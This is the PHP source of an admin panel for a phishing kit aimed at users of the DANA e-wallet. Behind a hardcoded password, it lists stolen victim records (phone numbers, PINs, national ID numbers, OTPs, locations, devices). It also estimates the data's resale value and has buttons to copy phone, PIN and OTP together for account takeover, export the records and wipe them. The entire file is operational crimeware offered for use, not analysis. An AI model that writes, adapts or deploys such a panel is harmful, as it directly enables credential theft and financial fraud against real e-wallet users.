<?php
$admin_password = "anjay123";

if(!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_PW'] != $admin_password) {
    header('WWW-Authenticate: Basic realm="DANA Admin"');
    header('HTTP/1.0 401 Unauthorized');
    echo "Access Denied";
    exit;
}

$logs = file_exists('logs.json') ? json_decode(file_get_contents('logs.json'), true) : [];
$total = count($logs);
$complete = count(array_filter($logs, fn($l) => isset($l['otp']) && $l['otp'] != '-'));
?>

<!DOCTYPE html>
<html>
<head>
    <title>DANA Phish Admin</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0e27;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .dashboard {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 30px;
            border-radius: 20px;
            margin-bottom: 20px;
            color: white;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            color: white;
            border: 1px solid #2a2f4a;
        }
        .stat-card h2 {
            font-size: 36px;
            margin: 10px 0;
        }
        .table-container {
            background: #1a1f3a;
            border-radius: 15px;
            padding: 20px;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            color: #00ff88;
            font-size: 12px;
        }
        th {
            background: #2a2f4a;
            padding: 12px;
            text-align: left;
            position: sticky;
            top: 0;
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #2a2f4a;
        }
        .copy-btn {
            background: #00ff88;
            color: #0a0e27;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        .delete-btn {
            background: #ff4757;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        .export-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
<div class="dashboard">
    <div class="header">
        <h1>💀 DANA PHISH DASHBOARD 💀</h1>
        <p>Real-time stolen data | Premium Version</p>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div>📊 TOTAL KORBAN</div>
            <h2><?php echo $total; ?></h2>
        </div>
        <div class="stat-card">
            <div>✅ DATA LENGKAP (dengan OTP)</div>
            <h2><?php echo $complete; ?></h2>
        </div>
        <div class="stat-card">
            <div>💰 ESTIMASI VALUE</div>
            <h2>$<?php echo $complete * 50; ?></h2>
            <small>~ Rp <?php echo number_format($complete * 750000); ?></small>
        </div>
    </div>
    
    <button class="export-btn" onclick="exportData()">📥 Export JSON</button>
    <button class="export-btn" onclick="deleteAll()" style="background:#ff4757;">🗑️ Delete All</button>
    
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Waktu</th>
                    <th>No HP</th>
                    <th>PIN</th>
                    <th>NIK</th>
                    <th>OTP</th>
                    <th>Lokasi</th>
                    <th>Device</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach($logs as $index => $log): ?>
                <tr>
                    <td><?php echo substr($log['timestamp'] ?? '', 5, 14); ?></td>
                    <td><?php echo $log['phone'] ?? '-'; ?></td>
                    <td><?php echo $log['pin'] ?? '-'; ?></td>
                    <td><?php echo substr($log['nik'] ?? '-', 0, 8) . '****'; ?></td>
                    <td style="color:#ffaa00;"><?php echo $log['otp'] ?? '-'; ?></td>
                    <td><?php echo $log['location'] ?? '-'; ?></td>
                    <td><?php echo $log['device'] ?? '-'; ?></td>
                    <td>
                        <button class="copy-btn" onclick="copyData('<?php echo $log['phone'] ?>|<?php echo $log['pin'] ?>|<?php echo $log['otp'] ?>')">Copy</button>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<script>
function copyData(text) {
    navigator.clipboard.writeText(text);
    alert('✅ Data disalin: ' + text);
}

function exportData() {
    window.location.href = 'export.php';
}

function deleteAll() {
    if(confirm('Yakin mau hapus semua data? Ini permanen!')) {
        fetch('delete.php', {method: 'POST'})
            .then(() => location.reload());
    }
}
</script>
</body>
</html>